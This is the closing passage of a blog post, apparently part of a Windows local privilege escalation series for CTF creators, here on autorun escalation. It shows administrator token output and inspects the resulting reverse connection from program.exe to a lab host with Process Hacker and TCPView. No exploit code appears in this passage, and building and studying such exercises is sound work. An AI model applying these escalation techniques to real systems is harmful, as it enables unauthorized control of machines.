+</span></span><span class="line"><span class="cl"><span class="o">=============================</span> <span class="o">============================================</span>
+</span></span><span class="line"><span class="cl">desktop-bn<span class="se">\a</span>dministrator S-1-5-21-264094270-2388996790-3434637240-500
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">GROUP INFORMATION
+</span></span><span class="line"><span class="cl">-----------------
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Group Name                                                    Type             SID          <span class="nv">Attributes</span>                                
+</span></span><span class="line"><span class="cl"><span class="o">=============================================================</span> <span class="o">================</span> <span class="o">============</span> <span class="o">===============================================================</span>
+</span></span><span class="line"><span class="cl">Everyone                                                      Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
+</span></span><span class="line"><span class="cl">NT AUTHORITY<span class="se">\L</span>ocal account and member of Administrators group Well-known group S-1-5-114    Mandatory group, Enabled by default, Enabled group
+</span></span><span class="line"><span class="cl">BUILTIN<span class="se">\A</span>dministrators                                        Alias            S-1-5-32-544 Mandatory group, Enabled by default, Enabled group, Group owner
+</span></span><span class="line"><span class="cl">BUILTIN<span class="se">\P</span>erformance Log Users                                 Alias            S-1-5-32-559 Mandatory group, Enabled by default, Enabled group
+</span></span><span class="line"><span class="cl">BUILTIN<span class="se">\U</span>sers                                                 Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
+</span></span><span class="line"><span class="cl">NT AUTHORITY<span class="se">\I</span>NTERACTIVE                                      Well-known group S-1-5-4      Mandatory group, Enabled by default, Enabled group
+</span></span><span class="line"><span class="cl">CONSOLE LOGON                                                 Well-known group S-1-2-1      Mandatory group, Enabled by default, Enabled group
+</span></span><span class="line"><span class="cl">NT AUTHORITY<span class="se">\A</span>uthenticated Users                              Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
+</span></span><span class="line"><span class="cl">NT AUTHORITY<span class="se">\T</span>his Organization                                Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
+</span></span><span class="line"><span class="cl">NT AUTHORITY<span class="se">\L</span>ocal account                                    Well-known group S-1-5-113    Mandatory group, Enabled by default, Enabled group
+</span></span><span class="line"><span class="cl">LOCAL                                                         Well-known group S-1-2-0      Mandatory group, Enabled by default, Enabled group
+</span></span><span class="line"><span class="cl">NT AUTHORITY<span class="se">\N</span>TLM Authentication                              Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
+</span></span><span class="line"><span class="cl">Mandatory Label<span class="se">\H</span>igh Mandatory Level                          Label            S-1-16-12288                                           
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">PRIVILEGES INFORMATION
+</span></span><span class="line"><span class="cl">----------------------
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Privilege Name                            Description                                                        <span class="nv">State</span>
+</span></span><span class="line"><span class="cl"><span class="o">=========================================</span> <span class="o">==================================================================</span> <span class="o">========</span>
+</span></span><span class="line"><span class="cl">SeIncreaseQuotaPrivilege                  Adjust memory quotas <span class="k">for</span> a process                                 Disabled
+</span></span><span class="line"><span class="cl">SeSecurityPrivilege                       Manage auditing and security log                                   Disabled
+</span></span><span class="line"><span class="cl">SeTakeOwnershipPrivilege                  Take ownership of files or other objects                           Disabled
+</span></span><span class="line"><span class="cl">SeLoadDriverPrivilege                     Load and unload device drivers                                     Disabled
+</span></span><span class="line"><span class="cl">SeSystemProfilePrivilege                  Profile system performance                                         Disabled
+</span></span><span class="line"><span class="cl">SeSystemtimePrivilege                     Change the system <span class="nb">time</span>                                             Disabled
+</span></span><span class="line"><span class="cl">SeProfileSingleProcessPrivilege           Profile single process                                             Disabled
+</span></span><span class="line"><span class="cl">SeIncreaseBasePriorityPrivilege           Increase scheduling priority                                       Disabled
+</span></span><span class="line"><span class="cl">SeCreatePagefilePrivilege                 Create a pagefile                                                  Disabled
+</span></span><span class="line"><span class="cl">SeBackupPrivilege                         Back up files and directories                                      Disabled
+</span></span><span class="line"><span class="cl">SeRestorePrivilege                        Restore files and directories                                      Disabled
+</span></span><span class="line"><span class="cl">SeShutdownPrivilege                       Shut down the system                                               Disabled
+</span></span><span class="line"><span class="cl">SeDebugPrivilege                          Debug programs                                                     Disabled
+</span></span><span class="line"><span class="cl">SeSystemEnvironmentPrivilege              Modify firmware environment values                                 Disabled
+</span></span><span class="line"><span class="cl">SeChangeNotifyPrivilege                   Bypass traverse checking                                           Enabled
+</span></span><span class="line"><span class="cl">SeRemoteShutdownPrivilege                 Force shutdown from a remote system                                Disabled
+</span></span><span class="line"><span class="cl">SeUndockPrivilege                         Remove computer from docking station                               Disabled
+</span></span><span class="line"><span class="cl">SeManageVolumePrivilege                   Perform volume maintenance tasks                                   Disabled
+</span></span><span class="line"><span class="cl">SeImpersonatePrivilege                    Impersonate a client after authentication                          Enabled
+</span></span><span class="line"><span class="cl">SeCreateGlobalPrivilege                   Create global objects                                              Enabled
+</span></span><span class="line"><span class="cl">SeIncreaseWorkingSetPrivilege             Increase a process working <span class="nb">set</span>                                     Disabled
+</span></span><span class="line"><span class="cl">SeTimeZonePrivilege                       Change the <span class="nb">time</span> zone                                               Disabled
+</span></span><span class="line"><span class="cl">SeCreateSymbolicLinkPrivilege             Create symbolic links                                              Disabled
+</span></span><span class="line"><span class="cl">SeDelegateSessionUserImpersonatePrivilege Obtain an impersonation token <span class="k">for</span> another user in the same session Disabled
+</span></span></code></pre></td></tr></table>
+</div>
+</div><blockquote>
+<p>Note: A firewall or an antivirus/anti-malware might block the connection.</p>
+</blockquote>
+<p>We can use Process Hacker to view the process token:</p>
+<figure><a class="lightgallery" href="/images/posts/process-hacker-autoruns.png" title="/images/posts/process-hacker-autoruns.png" data-thumbnail="/images/posts/process-hacker-autoruns.png" data-sub-html="<h2>Process Hacker AutoRuns</h2>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/images/posts/process-hacker-autoruns.png"
+            data-srcset="/images/posts/process-hacker-autoruns.png, /images/posts/process-hacker-autoruns.png 1.5x, /images/posts/process-hacker-autoruns.png 2x"
+            data-sizes="auto"
+            alt="/images/posts/process-hacker-autoruns.png" />
+    </a><figcaption class="image-caption">Process Hacker AutoRuns</figcaption>
+    </figure>
+<p>We can also view the connection with TCPView:</p>
+<figure><a class="lightgallery" href="/images/posts/tcpview-program.exe.png" title="/images/posts/tcpview-program.exe.png" data-thumbnail="/images/posts/tcpview-program.exe.png" data-sub-html="<h2>TCPView</h2>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/images/posts/tcpview-program.exe.png"
+            data-srcset="/images/posts/tcpview-program.exe.png, /images/posts/tcpview-program.exe.png 1.5x, /images/posts/tcpview-program.exe.png 2x"
+            data-sizes="auto"
+            alt="/images/posts/tcpview-program.exe.png" />
+    </a><figcaption class="image-caption">TCPView</figcaption>
+    </figure>
+<p>We could also use the TCPView command line version:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nb">PS </span><span class="n">C:</span><span class="p">\</span><span class="n">Tools</span><span class="p">\</span><span class="n">SysinternalsSuite</span><span class="p">&gt;</span> <span class="p">.\</span><span class="n">tcpvcon</span><span class="p">.</span><span class="py">exe</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">Tcpvcon</span><span class="p">.</span><span class="py">exe</span> <span class="n">v4</span><span class="p">.</span><span class="py">17</span> <span class="p">-</span> <span class="n">Sysinternals</span> <span class="n">TcpVcon</span>
+</span></span><span class="line"><span class="cl"><span class="n">Copyright</span> <span class="p">(</span><span class="n">C</span><span class="p">)</span> <span class="mf">1996</span><span class="p">-</span><span class="mf">2022</span> <span class="n">Mark</span> <span class="n">Russinovich</span> <span class="p">&amp;</span> <span class="n">Bryce</span> <span class="n">Cogswell</span>
+</span></span><span class="line"><span class="cl"><span class="n">Sysinternals</span> <span class="p">-</span> <span class="n">www</span><span class="p">.</span><span class="py">sysinternals</span><span class="p">.</span><span class="py">com</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="no">TCP</span><span class="p">]</span> <span class="n">svchost</span><span class="p">.</span><span class="py">exe</span>
+</span></span><span class="line"><span class="cl">        <span class="n">PID</span><span class="err">:</span>    <span class="mf">2980</span>
+</span></span><span class="line"><span class="cl">        <span class="n">State</span><span class="err">:</span>  <span class="n">ESTABLISHED</span>
+</span></span><span class="line"><span class="cl">        <span class="n">Local</span><span class="err">:</span>  <span class="nb">desktop-bn</span><span class="p">.</span><span class="py">localdomain</span>
+</span></span><span class="line"><span class="cl">        <span class="n">Remote</span><span class="err">:</span> <span class="mf">40.83</span><span class="p">.</span><span class="py">240</span><span class="p">.</span><span class="py">146</span>
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="no">TCP</span><span class="p">]</span> <span class="n">program</span><span class="p">.</span><span class="py">exe</span>
+</span></span><span class="line"><span class="cl">        <span class="n">PID</span><span class="err">:</span>    <span class="mf">16460</span>
+</span></span><span class="line"><span class="cl">        <span class="n">State</span><span class="err">:</span>  <span class="n">ESTABLISHED</span>
+</span></span><span class="line"><span class="cl">        <span class="n">Local</span><span class="err">:</span>  <span class="nb">desktop-bn</span><span class="p">.</span><span class="py">localdomain</span>
+</span></span><span class="line"><span class="cl">        <span class="n">Remote</span><span class="err">:</span> <span class="mf">192.168</span><span class="p">.</span><span class="py">119</span><span class="p">.</span><span class="py">130</span>
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="no">TCP] [System Process</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">        <span class="n">PID</span><span class="err">:</span>    <span class="mf">0</span>
+</span></span><span class="line"><span class="cl">        <span class="n">State</span><span class="err">:</span>  <span class="n">TIME_WAIT</span>
+</span></span><span class="line"><span class="cl">        <span class="n">Local</span><span class="err">:</span>  <span class="nb">desktop-bn</span><span class="p">.</span><span class="py">localdomain</span>
+</span></span><span class="line"><span class="cl">        <span class="n">Remote</span><span class="err">:</span> <span class="mf">52.143</span><span class="p">.</span><span class="py">80</span><span class="p">.</span><span class="py">209</span>
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="no">TCP</span><span class="p">]</span> <span class="n">explorer</span><span class="p">.</span><span class="py">exe</span>
+</span></span><span class="line"><span class="cl">        <span class="n">PID</span><span class="err">:</span>    <span class="mf">11356</span>
+</span></span><span class="line"><span class="cl">        <span class="n">State</span><span class="err">:</span>  <span class="n">ESTABLISHED</span>
+</span></span><span class="line"><span class="cl">        <span class="n">Local</span><span class="err">:</span>  <span class="nb">desktop-bn</span><span class="p">.</span><span class="py">localdomain</span>
+</span></span><span class="line"><span class="cl">        <span class="n">Remote</span><span class="err">:</span> <span class="mf">52.184</span><span class="p">.</span><span class="py">206</span><span class="p">.</span><span class="py">73</span>
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="no">TCP</span><span class="p">]</span> <span class="n">svchost</span><span class="p">.</span><span class="py">exe</span>
+</span></span><span class="line"><span class="cl">        <span class="n">PID</span><span class="err">:</span>    <span class="mf">3568</span>
+</span></span><span class="line"><span class="cl">        <span class="n">State</span><span class="err">:</span>  <span class="n">ESTABLISHED</span>
+</span></span><span class="line"><span class="cl">        <span class="n">Local</span><span class="err">:</span>  <span class="nb">desktop-bn</span><span class="p">.</span><span class="py">localdomain</span>
+</span></span><span class="line"><span class="cl">        <span class="n">Remote</span><span class="err">:</span> <span class="mf">52.143</span><span class="p">.</span><span class="py">84</span><span class="p">.</span><span class="py">45</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div></div><div class="post-footer" id="post-footer">
+    <div class="post-info">
+        <div class="post-info-line">
+            <div class="post-info-mod">
+                <span>Updated on 2022-03-20</span>
+            </div></div>
+        <div class="post-info-line">
+            <div class="post-info-md"></div>
+            <div class="post-info-share">
+                <span></span>
+            </div>
+        </div>
+    </div>
+
+    <div class="post-info-more">
+        <section class="post-tags"><i class="fas fa-tags fa-fw" aria-hidden="true"></i>&nbsp;<a href="/tags/registry-hives/">Registry Hives</a>,&nbsp;<a href="/tags/alwaysinstallelevated/">Alwaysinstallelevated</a>,&nbsp;<a href="/tags/autorun/">Autorun</a>,&nbsp;<a href="/tags/local-privilege-escalation/">Local Privilege Escalation</a>,&nbsp;<a href="/tags/windows/">Windows</a></section>
+        <section>
+            <span><a href="javascript:void(0);" onclick="window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="/">Home</a></span>
+        </section>
+    </div>
+
+    <div class="post-nav"><a href="/windows-privesc-scheduled-tasks/" class="prev" rel="prev" title="Windows Local Privilege Escalation - Scheduled Tasks for CTF Creators"><i class="fas fa-angle-left fa-fw" aria-hidden="true"></i>Windows Local Privilege Escalation - Scheduled Tasks for CTF Creators</a>
+            <a href="/windows-privesc-port-forwarding/" class="next" rel="next" title="Windows Local Privilege Escalation - Port Forwarding for CTF Creators">Windows Local Privilege Escalation - Port Forwarding for CTF Creators<i class="fas fa-angle-right fa-fw" aria-hidden="true"></i></a></div>
+</div>
+</article></div>
+            </main><footer class="footer">
+        <div class="footer-container"><div class="footer-line">Powered by <a href="https://gohugo.io/" target="_blank" rel="noopener noreffer" title="Hugo 0.138.0">Hugo</a> | Theme - <a href="https://github.com/dillonzq/LoveIt" target="_blank" rel="noopener noreffer" title="LoveIt 0.2.11"><i class="far fa-kiss-wink-heart fa-fw" aria-hidden="true"></i> LoveIt</a>
+                </div><div class="footer-line" itemscope itemtype="http://schema.org/CreativeWork"><i class="far fa-copyright fa-fw" aria-hidden="true"></i><span itemprop="copyrightYear">2021 - 2024</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="/" target="_blank"></a></span>&nbsp;|&nbsp;<span class="license"><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span></div>
+        </div>
+    </footer></div>
+
+        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="Back to Top">
+                <i class="fas fa-arrow-up fa-fw" aria-hidden="true"></i>
+            </a><a href="#" id="view-comments" class="fixed-button" title="View Comments">
+                <i class="fas fa-comment fa-fw" aria-hidden="true"></i>
+            </a>
+        </div><link rel="stylesheet" href="/lib/lightgallery/css/lightgallery-bundle.min.css"><link rel="stylesheet" href="/lib/katex/katex.min.css"><script type="text/javascript" src="/lib/autocomplete/autocomplete.min.js"></script><script type="text/javascript" src="/lib/lunr/lunr.min.js"></script><script type="text/javascript" src="/lib/lazysizes/lazysizes.min.js"></script><script type="text/javascript" src="/lib/lightgallery/lightgallery.min.js"></script><script type="text/javascript" src="/lib/lightgallery/plugins/thumbnail/lg-thumbnail.min.js"></script><script type="text/javascript" src="/lib/lightgallery/plugins/zoom/lg-zoom.min.js"></script><script type="text/javascript" src="/lib/clipboard/clipboard.min.js"></script><script type="text/javascript" src="/lib/sharer/sharer.min.js"></script><script type="text/javascript" src="/lib/katex/katex.min.js"></script><script type="text/javascript" src="/lib/katex/contrib/auto-render.min.js"></script><script type="text/javascript" src="/lib/katex/contrib/copy-tex.min.js"></script><script type="text/javascript" src="/lib/katex/contrib/mhchem.min.js"></script><script type="text/javascript">window.config={"code":{"copyTitle":"Copy to clipboard","maxShownLines":-1},"comment":{},"lightgallery":true,"math":{"delimiters":[{"display":true,"left":"$$","right":"$$"},{"display":true,"left":"\\[","right":"\\]"},{"display":true,"left":"\\begin{equation}","right":"\\end{equation}"},{"display":true,"left":"\\begin{equation*}","right":"\\end{equation*}"},{"display":true,"left":"\\begin{align}","right":"\\end{align}"},{"display":true,"left":"\\begin{align*}","right":"\\end{align*}"},{"display":true,"left":"\\begin{alignat}","right":"\\end{alignat}"},{"display":true,"left":"\\begin{alignat*}","right":"\\end{alignat*}"},{"display":true,"left":"\\begin{gather}","right":"\\end{gather}"},{"display":true,"left":"\\begin{CD}","right":"\\end{CD}"},{"display":false,"left":"$","right":"$"},{"display":false,"left":"\\(","right":"\\)"}],"strict":false},"search":{"highlightTag":"em","lunrIndexURL":"/index.json","maxResultLength":10,"noResultsFound":"No results found","snippetLength":30,"type":"lunr"}};</script><script type="text/javascript" src="/js/theme.min.js"></script></body>
+</html>
